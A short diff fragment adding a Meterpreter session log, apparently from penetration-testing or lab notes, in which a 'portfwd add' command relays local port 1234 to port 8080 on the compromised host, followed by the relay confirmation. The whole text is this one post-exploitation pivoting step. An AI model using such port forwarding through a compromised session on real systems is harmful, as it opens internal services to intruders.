@@ -1,0 +1,4 @@
+meterpreter > portfwd add -p 8080 -l 1234 -r 127.0.0.1
+[*] Forward TCP relay created: (local) :1234 -> (remote) 127.0.0.1:8080
+meterpreter > 
+
